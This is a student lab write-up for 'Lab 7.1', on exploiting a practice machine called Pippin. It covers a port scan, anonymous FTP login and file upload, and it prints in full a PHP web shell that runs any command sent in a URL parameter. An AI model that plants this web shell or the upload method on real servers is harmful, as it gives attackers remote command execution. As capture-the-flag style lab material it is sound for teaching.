# Lab 7.1

## Exploiting Pippin Objectives & Overview

* Scan target for services and version
* Use anonymous ftp user to upload and execute remote code on target
* Using the web shell, find secrets
* Get user access and find other users using Mysql
* Crack passwords for said users

## Scanning the target

The initial scan showed three open services:

* `FTP` on port 21
* `SSH` on port 22
* `HTTP` on port 80

All services were open, and something interesting was shown in the `ftp` field:

```bash
ftp-anon: Anonymous FTP login allowed
```

> This is important for initial access and RCE

## Testing FTP

FTP allows anonymous login meaning we can log into the account anonymous without
a real password

```bash
ftp <target>
anonymous
<password>
```

> Again, password can by anything

This should grant a ftp session. Now we can start testing permissions by
uploading a file. The one directory that is public is `upload`

```
put <filename>
```

> This should be successful and the file should now show up & be accessible
through a browser

Now that it is confirmed that files can be uploaded, things start to get
interesting. A `webshell` can be used to execute code as the `apache`
user. Below is the shell used for this assignment:

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body</html>
```

> Credit [Joshua Wright](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
